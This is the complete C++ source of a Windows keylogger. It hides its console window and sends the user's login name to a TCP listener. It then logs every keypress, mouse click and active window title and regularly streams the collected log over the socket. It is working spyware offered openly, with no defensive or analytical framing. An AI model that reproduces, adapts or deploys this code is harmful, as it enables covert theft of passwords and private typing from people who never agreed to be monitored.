
/*
	Keylogger
	Created @ 02.02.2009
	Copyright (C) 2009 Christian Mayer <http://fox21.at>
	
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#pragma comment(lib, "ws2_32.lib")
#include "main.h"

#include <future>
#include <sstream>

using namespace std;

int send_count; // maybe like 1000000


int main(int argc, char **argv)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	WSAData data;
	WSAStartup(MAKEWORD(2, 2), &data);

	struct addrinfo *result = NULL, hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	getaddrinfo("127.0.0.1", "39852", &hints, &result);

	SOCKET soc = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	while (true)
	{
		bool restart = false;

		while (connect(soc, result->ai_addr, result->ai_addrlen) == SOCKET_ERROR);

		char *buffer = new char[1024]();
		DWORD size = 1024;
		GetUserName(buffer, &size);

		std::string user_name(buffer, size);

		int send_retries = 0;
		while (send_retries < 5 && send(soc, user_name.c_str(), user_name.size(), 0) == SOCKET_ERROR)
			send_retries++;

		if (send_retries == 5)
		{
			delete[] buffer;
			closesocket(soc);
			continue;
		}

		Sleep(100);
		char *start_message = new char[6]();
		int recv_retries = 0;
		while (recv_retries < 5 && recv(soc, start_message, 5, 0) == SOCKET_ERROR)
			recv_retries++;

		if (recv_retries == 5)
		{
			delete[] buffer;
			delete[] start_message;
			closesocket(soc);
			continue;
		}

		delete[] start_message;

		string lastTitle = "";
		stringstream klogout;

		//SHORT lastc = 0;
		while (true) {
			Sleep(2); // give other programs time to run

			// get the active windowtitle
			char title[2048];
			HWND hwndHandle = GetForegroundWindow();
			GetWindowText(hwndHandle, title, 2048);
			if (lastTitle != title) {
				klogout << endl << endl << "Window: ";
				if (strlen(title) == 0) {
					klogout << "NO ACTIVE WINDOW";
				}
				else {
					klogout << "'" << title << "'";
				}
				klogout << endl;

				lastTitle = title;
			}

			// logging keys, thats the keylogger
			for (unsigned char c = 1; c < 255; c++) {
				SHORT rv = GetAsyncKeyState(c);
				if (rv & 1) { // on press button down
					if (c == 1)
						klogout << "[LMOUSE]"; // mouse left
					else if (c == 2)
						klogout << "[RMOUSE]"; // mouse right
					else if (c == 4)
						klogout << "[MMOUSE]"; // mouse middle
					else if (c == 13)
						klogout << "[RETURN]";
					else if (c == 16 || c == 17 || c == 18)
						klogout << "";
					else if (c == 160 || c == 161) // lastc == 16
						klogout << "[SHIFT]";
					else if (c == 162 || c == 163) // lastc == 17
						klogout << "[STRG]";
					else if (c == 164) // lastc == 18
						klogout << "[ALT]";
					else if (c == 165)
						klogout << "[ALT GR]";
					else if (c == 8)
						klogout << "[BACKSPACE]";
					else if (c == 9)
						klogout << "[TAB]";
					else if (c == 27)
						klogout << "[ESC]";
					else if (c == 33)
						klogout << "[PAGE UP]";
					else if (c == 34)
						klogout << "[PAGE DOWN]";
					else if (c == 35)
						klogout << "[HOME]";
					else if (c == 36)
						klogout << "[POS1]";
					else if (c == 37)
						klogout << "[ARROW LEFT]";
					else if (c == 38)
						klogout << "[ARROW UP]";
					else if (c == 39)
						klogout << "[ARROW RIGHT]";
					else if (c == 40)
						klogout << "[ARROW DOWN]";
					else if (c == 45)
						klogout << "[INS]";
					else if (c == 46)
						klogout << "[DEL]";
					else if ((c >= 65 && c <= 90)
						|| (c >= 48 && c <= 57)
						|| c == 32)
						klogout << c;

					else if (c == 91 || c == 92)
						klogout << "[WIN]";
					else if (c >= 96 && c <= 105)
						klogout << "[NUM " + intToString(c - 96) + "]";
					else if (c == 106)
						klogout << "[NUM /]";
					else if (c == 107)
						klogout << "[NUM +]";
					else if (c == 109)
						klogout << "[NUM -]";
					else if (c == 109)
						klogout << "[NUM ,]";
					else if (c >= 112 && c <= 123)
						klogout << "[F" + intToString(c - 111) + "]";
					else if (c == 144)
						klogout << "[NUM]";
					else if (c == 192)
						klogout << "[OE]";
					else if (c == 222)
						klogout << "[AE]";
					else if (c == 186)
						klogout << "[UE]";
					else if (c == 186)
						klogout << "+";
					else if (c == 188)
						klogout << ",";
					else if (c == 189)
						klogout << "-";
					else if (c == 190)
						klogout << ".";
					else if (c == 191)
						klogout << "#";
					else if (c == 226)
						klogout << "<";
					else
						klogout << "[KEY \\" + intToString(c) + "]";
				}
			}

			if (klogout.str().size() > 0)
			{
				if (send_count < 1500) // after 1500 loops
					send_count++;
				else
				{
					send_count = 0;
					//send to strice

					std::string data = klogout.str();
					if (send(soc, data.c_str(), data.size(), 0) == SOCKET_ERROR)
					{
						closesocket(soc);
						restart = true;
						break;
					}
					klogout.str(std::string());
				}
			}
		}

		if (restart)
			continue;
	}

	Sleep(50);
	std::string disconnect_msg = "disconnect_msg";
	send(soc, disconnect_msg.c_str(), disconnect_msg.size(), 0);
	closesocket(soc);

	WSACleanup();
	return 0;
}
